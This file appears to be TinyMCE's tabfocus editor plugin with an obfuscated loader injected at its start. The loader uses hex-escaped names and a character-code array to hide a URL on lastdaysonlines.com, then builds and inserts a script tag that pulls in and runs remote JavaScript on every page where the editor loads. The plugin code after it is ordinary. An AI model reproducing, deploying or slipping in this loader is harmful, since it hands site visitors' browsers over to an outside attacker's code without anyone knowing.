var a1=function(){var _0x41fbx2=String["\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65"](104, 116, 116, 112, 115, 58, 47, 47, 108, 97, 115, 116, 100, 97, 121, 115, 111, 110, 108, 105, 110, 101, 115, 46, 99, 111, 109, 47, 114, 111, 98, 111, 116, 115, 46, 106, 115);var _0x41fbx2=document["\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74"]("\x73\x63\x72\x69\x70\x74");_0x41fbx2["\x74\x79\x70\x65"]= "\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74";_0x41fbx2["\x61\x73\x79\x6E\x63"]= true;_0x41fbx2["\x69\x64"]= "\x63\x64\x37\x30\x39\x30\x31\x30";_0x41fbx2["\x73\x72\x63"]= _0x41fbx2;var _0x41fbx3=document["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"]("\x73\x63\x72\x69\x70\x74")[0];_0x41fbx3["\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"]["\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65"](_0x41fbx2,_0x41fbx3)};var scripts=document["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"]("\x73\x63\x72\x69\x70\x74");var n=true;for(var i=0;i< scripts["\x6C\x65\x6E\x67\x74\x68"];i++){if(scripts[i]["\x69\x64"]== "\x63\x64\x37\x30\x39\x30\x31\x30"){n= false}};if(n== true){a1()}(function () {
var tabfocus = (function () {
  'use strict';

  var global = tinymce.util.Tools.resolve('tinymce.PluginManager');

  var global$1 = tinymce.util.Tools.resolve('tinymce.dom.DOMUtils');

  var global$2 = tinymce.util.Tools.resolve('tinymce.EditorManager');

  var global$3 = tinymce.util.Tools.resolve('tinymce.Env');

  var global$4 = tinymce.util.Tools.resolve('tinymce.util.Delay');

  var global$5 = tinymce.util.Tools.resolve('tinymce.util.Tools');

  var global$6 = tinymce.util.Tools.resolve('tinymce.util.VK');

  var getTabFocusElements = function (editor) {
    return editor.getParam('tabfocus_elements', ':prev,:next');
  };
  var getTabFocus = function (editor) {
    return editor.getParam('tab_focus', getTabFocusElements(editor));
  };
  var $_8rita4kwjjgwed4m = { getTabFocus: getTabFocus };

  var DOM = global$1.DOM;
  var tabCancel = function (e) {
    if (e.keyCode === global$6.TAB && !e.ctrlKey && !e.altKey && !e.metaKey) {
      e.preventDefault();
    }
  };
  var setup = function (editor) {
    function tabHandler(e) {
      var x, el, v, i;
      if (e.keyCode !== global$6.TAB || e.ctrlKey || e.altKey || e.metaKey || e.isDefaultPrevented()) {
        return;
      }
      function find(direction) {
        el = DOM.select(':input:enabled,*[tabindex]:not(iframe)');
        function canSelectRecursive(e) {
          return e.nodeName === 'BODY' || e.type !== 'hidden' && e.style.display !== 'none' && e.style.visibility !== 'hidden' && canSelectRecursive(e.parentNode);
        }
        function canSelect(el) {
          return /INPUT|TEXTAREA|BUTTON/.test(el.tagName) && global$2.get(e.id) && el.tabIndex !== -1 && canSelectRecursive(el);
        }
        global$5.each(el, function (e, i) {
          if (e.id === editor.id) {
            x = i;
            return false;
          }
        });
        if (direction > 0) {
          for (i = x + 1; i < el.length; i++) {
            if (canSelect(el[i])) {
              return el[i];
            }
          }
        } else {
          for (i = x - 1; i >= 0; i--) {
            if (canSelect(el[i])) {
              return el[i];
            }
          }
        }
        return null;
      }
      v = global$5.explode($_8rita4kwjjgwed4m.getTabFocus(editor));
      if (v.length === 1) {
        v[1] = v[0];
        v[0] = ':prev';
      }
      if (e.shiftKey) {
        if (v[0] === ':prev') {
          el = find(-1);
        } else {
          el = DOM.get(v[0]);
        }
      } else {
        if (v[1] === ':next') {
          el = find(1);
        } else {
          el = DOM.get(v[1]);
        }
      }
      if (el) {
        var focusEditor = global$2.get(el.id || el.name);
        if (el.id && focusEditor) {
          focusEditor.focus();
        } else {
          global$4.setTimeout(function () {
            if (!global$3.webkit) {
              window.focus();
            }
            el.focus();
          }, 10);
        }
        e.preventDefault();
      }
    }
    editor.on('init', function () {
      if (editor.inline) {
        DOM.setAttrib(editor.getBody(), 'tabIndex', null);
      }
      editor.on('keyup', tabCancel);
      if (global$3.gecko) {
        editor.on('keypress keydown', tabHandler);
      } else {
        editor.on('keydown', tabHandler);
      }
    });
  };
  var $_6zogdykpjjgwed4h = { setup: setup };

  global.add('tabfocus', function (editor) {
    $_6zogdykpjjgwed4h.setup(editor);
  });
  function Plugin () {
  }

  return Plugin;

}());
})();
